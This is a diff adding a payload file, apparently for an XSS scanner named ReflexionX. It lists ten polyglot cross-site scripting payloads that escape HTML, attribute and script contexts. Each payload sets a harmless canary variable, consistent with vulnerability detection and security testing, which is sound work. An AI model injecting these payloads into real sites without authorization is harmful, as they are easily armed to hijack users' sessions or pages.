@@ -1,0 +1,14 @@
+# ReflexionX v1.0.0 — Polyglot XSS Payloads
+# Context-agnostic payloads that work across HTML body/attr/JS contexts
+# Each payload sets window._xss_confirmed = 'CANARY'
+
+'"><img src=x onerror=window._xss_confirmed='CANARY'>//<svg/onload=window._xss_confirmed='CANARY'>//
+'\"--></style></script><svg onload=window._xss_confirmed='CANARY'>//
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=window._xss_confirmed='CANARY' )//%0D%0A
+"'><details/open/ontoggle=window._xss_confirmed='CANARY'>//
+}}}};window._xss_confirmed='CANARY';//"'--><svg onload=window._xss_confirmed='CANARY'>
+javascript:void(window._xss_confirmed='CANARY')//"'><img src=x onerror=window._xss_confirmed='CANARY'>
+'";!--"<svg/onload=window._xss_confirmed='CANARY'>=&{()}
+"><svg/onload=window._xss_confirmed='CANARY'>"'><img src=x onerror=window._xss_confirmed='CANARY'>
+</script><script>window._xss_confirmed='CANARY'</script><img src=x onerror=window._xss_confirmed='CANARY'>
+'-window._xss_confirmed='CANARY'-'"-window._xss_confirmed='CANARY'-"
